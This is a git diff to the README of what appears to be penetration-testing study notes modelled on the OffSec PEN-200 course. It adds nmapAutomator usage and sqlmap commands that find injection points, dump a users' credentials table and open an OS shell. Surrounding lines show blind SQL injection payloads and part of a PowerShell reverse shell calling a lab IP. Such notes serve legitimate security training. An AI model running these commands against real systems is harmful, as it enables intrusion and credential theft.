@@ -97,6 +97,10 @@ This repo is structured in the same manner as the OffSec PEN-200 course and will
 - Using snmpwalk to enumerate local open ports: ```snmpwalk -c public -v1 <host IP> 1.3.6.1.2.1.6.13.1.3```
 - Using snmpwalk to translate hex to ASCII: ```snmpwalk -c public -v1 -t 10 <host IP> -Oa```
 
+## nmapAutomator
+
+- Example: ```./nmapAutomator.sh --host 10.1.1.1 --type All```
+
 # Vulnerability Scanning
 
 - Initialize Nessus: ```sudo systemctl start nessusd.service```
@@ -237,3 +241,10 @@ $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444)
 - Blind SQLi
   - Test for boolean-based: ```http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //```
   - Test for time-based: ```http://192.168.50.16/blindsqli.php?user=offsec' AND IF (1=1, sleep(3),'false') -- //```
+
+### Automating SQL Injection Attacks
+
+- Basic sqlmap to quickly find SQL injection points: ```sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user```
+- Running sqlmap to Dump Users Credentials Table: ```sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump```
+- Running sqlmap with os-shell: ```sqlmap -r post.txt -p item  --os-shell  --web-root "/var/www/html/tmp"```
+  - 4 >> id >> y >> pwd >> y
